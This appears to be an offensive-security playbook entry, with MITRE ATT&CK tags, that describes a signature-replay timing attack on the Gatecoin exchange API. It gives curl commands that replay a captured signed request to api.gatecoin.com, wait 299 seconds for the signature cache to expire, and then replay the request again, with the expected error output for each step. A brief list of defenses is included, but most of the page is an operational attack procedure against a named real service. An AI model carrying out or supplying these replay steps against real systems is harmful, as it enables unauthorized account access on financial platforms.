---
id: proc-gatecoin-wait-cache
name: Wait for Signature Cache Expiration
tags:
  - timing-attack
  - cache-exploitation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-test-replay-cache]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:32:20.796Z'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Wait for Signature Cache Expiration

## Summary

This procedure involves delaying replay attempts until the 5-minute signature cache on the Gatecoin server expires (after 299 seconds), while ensuring the original future timestamp remains within the server's 5-minute validation window, confirmed by monitoring error responses.

## Description

Gatecoin caches signatures for 5 minutes to prevent duplicates, but the timestamp validation allows requests up to 5 minutes old. With a 3-second future timestamp, waiting 299 seconds positions the replay just after cache removal but before timestamp rejection. This exploits the timing discrepancy when the client clock is ahead. Requires the initial signed request from prior steps.

## Requirements

1. Captured initial request with signature and future timestamp
2. Ability to send test API requests
3. Timing precision (use sleep command)
4. Access to error response parsing for validation

## Defense

Defensive measures and detection strategies:

- Align cache duration with timestamp window or make cache indefinite for signatures
- Detect rapid retry patterns indicative of timing probes
- Log and alert on signature reuse attempts post-cache
- Use shorter cache times or per-request nonces

## Objectives

1. Confirm cache presence via duplicate errors
2. Wait precisely 299 seconds for expiration
3. Validate timestamp remains acceptable

## Instructions

### Step 1: Test Initial Replay for Cache Hit

**Context**: Send a test replay to confirm the signature is cached, expecting a duplicate error.

**Command** ([[commands/curl-test-replay-cache]]):
```bash
curl -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer REUSED_SIGNATURE' \
  -H 'Content-Type: application/json' \
  -d '@initial_request.json' \
  --output test_response.json
cat test_response.json
```

> Expected output: HTTP 401 'The same request was already made within the same millisecond.' This confirms cache hit.

### Step 2: Implement Wait and Retest

**Context**: Pause for 299 seconds, then retest to confirm cache miss.

**Command** ([[commands/curl-test-replay-cache]] with sleep):
```bash
echo "Cache hit confirmed. Waiting 299 seconds..."
sleep 299
curl -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer REUSED_SIGNATURE' \
  -H 'Content-Type: application/json' \
  -d '@initial_request.json' \
  --output post_wait_response.json
cat post_wait_response.json
```

> After sleep, expected output: No duplicate error, but request may still fail if timestamp invalid; check for timestamp error instead.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/curl-test-replay-cache]]

## Tools Used


## Tags

- [[timing-attack]]
- [[cache-exploitation]]
